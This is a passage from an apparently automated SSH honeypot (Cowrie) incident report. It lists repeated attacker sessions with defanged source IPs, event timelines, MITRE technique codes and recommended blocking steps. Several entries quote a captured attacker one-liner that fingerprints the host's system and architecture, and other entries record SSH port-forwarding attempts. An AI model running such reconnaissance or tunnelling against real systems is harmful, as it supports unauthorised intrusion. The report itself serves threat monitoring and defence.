| `2026-07-24 20:23:29` | `cowrie.command.input` |
| `2026-07-24 20:23:29` | `cowrie.command.input` |
| `2026-07-24 20:23:29` | `cowrie.command.input` |
| `2026-07-24 20:23:29` | `cowrie.command.input` |
| `2026-07-24 20:23:29` | `cowrie.command.success` |
| `2026-07-24 20:23:29` | `cowrie.command.input` |
| `2026-07-24 20:23:29` | `cowrie.command.input` |
| `2026-07-24 20:23:29` | `cowrie.command.input` |
| `2026-07-24 20:23:29` | `cowrie.command.input` |
| `2026-07-24 20:23:29` | `cowrie.log.closed` |
| `2026-07-24 20:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29d44a4279c5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:24 |
| **Last Seen** | 2026-07-24 20:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:24:28` | `cowrie.session.connect` |
| `2026-07-24 20:24:29` | `cowrie.client.version` |
| `2026-07-24 20:24:29` | `cowrie.client.kex` |
| `2026-07-24 20:24:31` | `cowrie.login.success` |
| `2026-07-24 20:24:33` | `cowrie.session.params` |
| `2026-07-24 20:24:33` | `cowrie.command.input` |
| `2026-07-24 20:24:33` | `cowrie.command.input` |
| `2026-07-24 20:24:33` | `cowrie.command.input` |
| `2026-07-24 20:24:33` | `cowrie.command.input` |
| `2026-07-24 20:24:33` | `cowrie.command.input` |
| `2026-07-24 20:24:33` | `cowrie.command.success` |
| `2026-07-24 20:24:33` | `cowrie.command.input` |
| `2026-07-24 20:24:33` | `cowrie.command.input` |
| `2026-07-24 20:24:33` | `cowrie.command.input` |
| `2026-07-24 20:24:33` | `cowrie.command.input` |
| `2026-07-24 20:24:33` | `cowrie.log.closed` |
| `2026-07-24 20:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6baa001b9520

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:25 |
| **Last Seen** | 2026-07-24 20:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:25:31` | `cowrie.session.connect` |
| `2026-07-24 20:25:31` | `cowrie.client.version` |
| `2026-07-24 20:25:31` | `cowrie.client.kex` |
| `2026-07-24 20:25:33` | `cowrie.login.success` |
| `2026-07-24 20:25:35` | `cowrie.session.params` |
| `2026-07-24 20:25:35` | `cowrie.command.input` |
| `2026-07-24 20:25:35` | `cowrie.command.input` |
| `2026-07-24 20:25:35` | `cowrie.command.input` |
| `2026-07-24 20:25:35` | `cowrie.command.input` |
| `2026-07-24 20:25:35` | `cowrie.command.input` |
| `2026-07-24 20:25:35` | `cowrie.command.success` |
| `2026-07-24 20:25:35` | `cowrie.command.input` |
| `2026-07-24 20:25:35` | `cowrie.command.input` |
| `2026-07-24 20:25:35` | `cowrie.command.input` |
| `2026-07-24 20:25:35` | `cowrie.command.input` |
| `2026-07-24 20:25:35` | `cowrie.log.closed` |
| `2026-07-24 20:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f29f7c24f5e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:26 |
| **Last Seen** | 2026-07-24 20:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:26:35` | `cowrie.session.connect` |
| `2026-07-24 20:26:35` | `cowrie.client.version` |
| `2026-07-24 20:26:35` | `cowrie.client.kex` |
| `2026-07-24 20:26:37` | `cowrie.login.success` |
| `2026-07-24 20:26:38` | `cowrie.session.params` |
| `2026-07-24 20:26:38` | `cowrie.command.input` |
| `2026-07-24 20:26:38` | `cowrie.command.input` |
| `2026-07-24 20:26:38` | `cowrie.command.input` |
| `2026-07-24 20:26:38` | `cowrie.command.input` |
| `2026-07-24 20:26:38` | `cowrie.command.input` |
| `2026-07-24 20:26:38` | `cowrie.command.success` |
| `2026-07-24 20:26:38` | `cowrie.command.input` |
| `2026-07-24 20:26:38` | `cowrie.command.input` |
| `2026-07-24 20:26:38` | `cowrie.command.input` |
| `2026-07-24 20:26:38` | `cowrie.command.input` |
| `2026-07-24 20:26:39` | `cowrie.log.closed` |
| `2026-07-24 20:26:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b946b1766d08

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:27 |
| **Last Seen** | 2026-07-24 20:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:27:40` | `cowrie.session.connect` |
| `2026-07-24 20:27:41` | `cowrie.client.version` |
| `2026-07-24 20:27:41` | `cowrie.client.kex` |
| `2026-07-24 20:27:42` | `cowrie.login.success` |
| `2026-07-24 20:27:44` | `cowrie.session.params` |
| `2026-07-24 20:27:44` | `cowrie.command.input` |
| `2026-07-24 20:27:44` | `cowrie.command.input` |
| `2026-07-24 20:27:44` | `cowrie.command.input` |
| `2026-07-24 20:27:44` | `cowrie.command.input` |
| `2026-07-24 20:27:44` | `cowrie.command.input` |
| `2026-07-24 20:27:44` | `cowrie.command.success` |
| `2026-07-24 20:27:44` | `cowrie.command.input` |
| `2026-07-24 20:27:44` | `cowrie.command.input` |
| `2026-07-24 20:27:44` | `cowrie.command.input` |
| `2026-07-24 20:27:44` | `cowrie.command.input` |
| `2026-07-24 20:27:44` | `cowrie.log.closed` |
| `2026-07-24 20:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1480d86d31dc

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]52` |
| **First Seen** | 2026-07-24 20:28 |
| **Last Seen** | 2026-07-24 20:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:28:11` | `cowrie.session.connect` |
| `2026-07-24 20:28:11` | `cowrie.client.version` |
| `2026-07-24 20:28:11` | `cowrie.client.kex` |
| `2026-07-24 20:28:12` | `cowrie.login.success` |
| `2026-07-24 20:28:12` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]52` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee4763cdd602

| Field | Detail |
|---|---|
| **Source IP** | `69.126.144[.]30` |
| **First Seen** | 2026-07-24 20:28 |
| **Last Seen** | 2026-07-24 20:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:28:12` | `cowrie.session.connect` |
| `2026-07-24 20:28:13` | `cowrie.client.version` |
| `2026-07-24 20:28:13` | `cowrie.client.kex` |
| `2026-07-24 20:28:13` | `cowrie.login.success` |
| `2026-07-24 20:28:14` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:28:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.126.144[.]30` to AbuseIPDB if not already reported
- [ ] Block `69.126.144[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee67a1fafab

| Field | Detail |
|---|---|
| **Source IP** | `222.222.124[.]164` |
| **First Seen** | 2026-07-24 20:28 |
| **Last Seen** | 2026-07-24 20:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:28:17` | `cowrie.session.connect` |
| `2026-07-24 20:28:18` | `cowrie.client.version` |
| `2026-07-24 20:28:18` | `cowrie.client.kex` |
| `2026-07-24 20:28:20` | `cowrie.login.success` |
| `2026-07-24 20:28:20` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.222.124[.]164` to AbuseIPDB if not already reported
- [ ] Block `222.222.124[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-738cdaae8daf

| Field | Detail |
|---|---|
| **Source IP** | `61.12.86[.]90` |
| **First Seen** | 2026-07-24 20:28 |
| **Last Seen** | 2026-07-24 20:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:28:19` | `cowrie.session.connect` |
| `2026-07-24 20:28:20` | `cowrie.client.version` |
| `2026-07-24 20:28:20` | `cowrie.client.kex` |
| `2026-07-24 20:28:21` | `cowrie.login.success` |
| `2026-07-24 20:28:22` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.86[.]90` to AbuseIPDB if not already reported
- [ ] Block `61.12.86[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c4f5f43119a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:28 |
| **Last Seen** | 2026-07-24 20:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:28:48` | `cowrie.session.connect` |
| `2026-07-24 20:28:48` | `cowrie.client.version` |
| `2026-07-24 20:28:48` | `cowrie.client.kex` |
| `2026-07-24 20:28:50` | `cowrie.login.success` |
| `2026-07-24 20:28:51` | `cowrie.session.params` |
| `2026-07-24 20:28:51` | `cowrie.command.input` |
| `2026-07-24 20:28:51` | `cowrie.command.input` |
| `2026-07-24 20:28:51` | `cowrie.command.input` |
| `2026-07-24 20:28:51` | `cowrie.command.input` |
| `2026-07-24 20:28:51` | `cowrie.command.input` |
| `2026-07-24 20:28:51` | `cowrie.command.success` |
| `2026-07-24 20:28:51` | `cowrie.command.input` |
| `2026-07-24 20:28:51` | `cowrie.command.input` |
| `2026-07-24 20:28:51` | `cowrie.command.input` |
| `2026-07-24 20:28:51` | `cowrie.command.input` |
| `2026-07-24 20:28:52` | `cowrie.log.closed` |
| `2026-07-24 20:28:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3cec8dd02b1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:29 |
| **Last Seen** | 2026-07-24 20:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:29:58` | `cowrie.session.connect` |
| `2026-07-24 20:29:58` | `cowrie.client.version` |
| `2026-07-24 20:29:58` | `cowrie.client.kex` |
| `2026-07-24 20:29:59` | `cowrie.login.success` |
| `2026-07-24 20:30:01` | `cowrie.session.params` |
| `2026-07-24 20:30:01` | `cowrie.command.input` |
| `2026-07-24 20:30:01` | `cowrie.command.input` |
| `2026-07-24 20:30:01` | `cowrie.command.input` |
| `2026-07-24 20:30:01` | `cowrie.command.input` |
| `2026-07-24 20:30:01` | `cowrie.command.input` |
| `2026-07-24 20:30:01` | `cowrie.command.success` |
| `2026-07-24 20:30:01` | `cowrie.command.input` |
| `2026-07-24 20:30:01` | `cowrie.command.input` |
| `2026-07-24 20:30:01` | `cowrie.command.input` |
| `2026-07-24 20:30:01` | `cowrie.command.input` |
| `2026-07-24 20:30:01` | `cowrie.log.closed` |
| `2026-07-24 20:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4b7ec258341

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-24 20:30 |
| **Last Seen** | 2026-07-24 20:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:30:18` | `cowrie.session.connect` |
| `2026-07-24 20:30:19` | `cowrie.client.version` |
| `2026-07-24 20:30:19` | `cowrie.client.kex` |
| `2026-07-24 20:30:20` | `cowrie.login.success` |
| `2026-07-24 20:30:20` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfaf8ab956b6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:31 |
| **Last Seen** | 2026-07-24 20:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:31:08` | `cowrie.session.connect` |
| `2026-07-24 20:31:08` | `cowrie.client.version` |
| `2026-07-24 20:31:08` | `cowrie.client.kex` |
| `2026-07-24 20:31:10` | `cowrie.login.success` |
| `2026-07-24 20:31:11` | `cowrie.session.params` |
| `2026-07-24 20:31:11` | `cowrie.command.input` |
| `2026-07-24 20:31:11` | `cowrie.command.input` |
| `2026-07-24 20:31:11` | `cowrie.command.input` |
| `2026-07-24 20:31:11` | `cowrie.command.input` |
| `2026-07-24 20:31:11` | `cowrie.command.input` |
| `2026-07-24 20:31:11` | `cowrie.command.success` |
| `2026-07-24 20:31:11` | `cowrie.command.input` |
| `2026-07-24 20:31:11` | `cowrie.command.input` |
| `2026-07-24 20:31:11` | `cowrie.command.input` |
| `2026-07-24 20:31:11` | `cowrie.command.input` |
| `2026-07-24 20:31:11` | `cowrie.log.closed` |
| `2026-07-24 20:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9800a7e5b068

| Field | Detail |
|---|---|
| **Source IP** | `116.114.84[.]246` |
| **First Seen** | 2026-07-24 20:31 |
| **Last Seen** | 2026-07-24 20:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:31:41` | `cowrie.session.connect` |
| `2026-07-24 20:31:42` | `cowrie.client.version` |
| `2026-07-24 20:31:42` | `cowrie.client.kex` |
| `2026-07-24 20:31:44` | `cowrie.login.success` |
| `2026-07-24 20:31:44` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.84[.]246` to AbuseIPDB if not already reported
- [ ] Block `116.114.84[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21f589e542e8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:32 |
| **Last Seen** | 2026-07-24 20:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:32:18` | `cowrie.session.connect` |
| `2026-07-24 20:32:18` | `cowrie.client.version` |
| `2026-07-24 20:32:18` | `cowrie.client.kex` |
| `2026-07-24 20:32:19` | `cowrie.login.success` |
| `2026-07-24 20:32:21` | `cowrie.session.params` |
| `2026-07-24 20:32:21` | `cowrie.command.input` |
| `2026-07-24 20:32:21` | `cowrie.command.input` |
| `2026-07-24 20:32:21` | `cowrie.command.input` |
| `2026-07-24 20:32:21` | `cowrie.command.input` |
| `2026-07-24 20:32:21` | `cowrie.command.input` |
| `2026-07-24 20:32:21` | `cowrie.command.success` |
| `2026-07-24 20:32:21` | `cowrie.command.input` |
| `2026-07-24 20:32:21` | `cowrie.command.input` |
| `2026-07-24 20:32:21` | `cowrie.command.input` |
| `2026-07-24 20:32:21` | `cowrie.command.input` |
| `2026-07-24 20:32:21` | `cowrie.log.closed` |
| `2026-07-24 20:32:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-858756e45fb9

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-07-24 20:33 |
| **Last Seen** | 2026-07-24 20:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:33:14` | `cowrie.session.connect` |
| `2026-07-24 20:33:15` | `cowrie.client.version` |
| `2026-07-24 20:33:15` | `cowrie.client.kex` |
| `2026-07-24 20:33:17` | `cowrie.login.success` |
| `2026-07-24 20:33:18` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0acad5c702a

| Field | Detail |
|---|---|
| **Source IP** | `88.255.189[.]44` |
| **First Seen** | 2026-07-24 20:33 |
| **Last Seen** | 2026-07-24 20:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:33:23` | `cowrie.session.connect` |
| `2026-07-24 20:33:24` | `cowrie.client.version` |
| `2026-07-24 20:33:24` | `cowrie.client.kex` |
| `2026-07-24 20:33:25` | `cowrie.login.success` |
| `2026-07-24 20:33:26` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.255.189[.]44` to AbuseIPDB if not already reported
- [ ] Block `88.255.189[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
